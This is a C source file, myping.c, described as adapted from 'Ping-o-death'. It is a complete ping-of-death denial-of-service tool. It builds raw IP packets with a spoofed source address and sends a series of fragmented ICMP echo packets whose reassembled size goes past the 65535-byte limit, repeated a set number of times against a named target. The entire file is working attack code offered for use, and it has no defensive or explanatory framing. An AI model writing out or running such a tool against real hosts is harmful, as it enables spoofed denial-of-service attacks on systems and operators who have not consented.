/********************************************************
  File: myping.c
  Description:  Taken from source of Ping-o-death
                Creates Fragmented IP protocol packets

                2009 October 25
  - File first created and completed
  - Changes were inet_ntoa and replaced with inet_ntop
********************************************************/

# include <stdio.h>
# include <stdlib.h>
# include <sys/types.h>
# include <sys/socket.h>
# include <netdb.h>
# include <netinet/in.h>
# include <netinet/in_systm.h>
# include <netinet/ip.h>
# include <netinet/ip_icmp.h>
# include <string.h>
# include <arpa/inet.h>

int main (int argc, char * argv[]) {

  int s, i;
  char buf[400];
  char buf2[128];
  struct ip * ip = (struct ip *)buf;
  struct icmphdr * icmp = (struct icmphdr *)(ip + 1);
  struct hostent * hp, * hp2;
  struct sockaddr_in dst;
  int offset;
  int on;
  int num = 100;

  if (argc < 3) {
    printf ("\nUsage: %s <saddress> <dstaddress> [number]\n", argv[0]);
    printf (" - saddress is the spoofed source address\n");
    printf (" - dstaddress is the target\n");
    printf (" - number is the number of packets to send, 100 (default)\n");
    exit (1);
  }

  if (argc == 4) 
    /* Copy the packet number */
    num = atoi (argv[3]);

  /* Looping each packet */
  for (i = 1; i <= num; i++) {
    on = 1;
    bzero (buf, sizeof(buf));

    /* Create RAW socket */
    if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
      perror ("socket() error");
      /* If something wrong, exit */
      exit (1);
    }

    /* socket options, tell the kernel we provide the IP structure */
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
      perror ("setsockopt() for IP_HDRINCL error");
      exit (1);
    }

    if ((hp = gethostbyname (argv[2])) == NULL) {
      if ((ip->ip_dst.s_addr = inet_addr (argv[2])) == -1) {
        fprintf (stderr, "%s: Can't resolve unknown host\n", argv[2]);
        exit (1);
      }
    }
    else 
      bcopy (hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);

    /* The following source address just redundant for target to collect */
    if ((hp2 = gethostbyname(argv[1])) == NULL) {
      if ((ip->ip_src.s_addr = inet_addr (argv[1])) == -1) {
        fprintf (stderr, "%s: Can't resolve unknown spoofed host\n", argv[1]);
        exit (1);
      }
    }
    else
      bcopy (hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);

    inet_ntop (AF_INET, &ip->ip_dst, buf2, sizeof(buf2)); 
    printf ("Sending to %s from spoofed %s\n", buf2, argv[1]);
    
    /* IP structure (/usr/include/netinet/ip.h) */
    ip->ip_v = 4;
    ip->ip_hl = sizeof *ip >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons (sizeof (buf));
    ip->ip_id = htons (4321);
    ip->ip_off = htons (0);
    ip->ip_ttl = 255;
    ip->ip_p = 1;
    ip->ip_sum = 0; /* Let kernel fills in */

    dst.sin_addr = ip->ip_dst;
    dst.sin_family = AF_INET;

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    
    /* Header checksum */
    icmp->checksum = htons (~(ICMP_ECHO << 8)); /* why? */

    for (offset = 0; offset < 65536; offset += (sizeof (buf) - sizeof (*ip))) {
      ip->ip_off = htons (offset >> 3);

      if (offset < 65120)
        ip->ip_off |= htons (0x2000);
      else
        ip->ip_len = htons (418); /* Make total 65538 */

      /* sending time */
      if (sendto(
          s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        fprintf (stderr, "offset %d: ", offset);
        perror ("sendto() error");
      }
      else
        printf ("sendto() is OK\n");

      /* If offset = 0, define our ICMP structure */
      if (offset == 0) {
        icmp->type = 0;
        icmp->code = 0;
        icmp->checksum = 0;
      }  
    } /* for (offset) */

    /* Close socket */
    close (s);
    usleep (30000);
  } /* for (i <= num packets) */

  return 0;
}
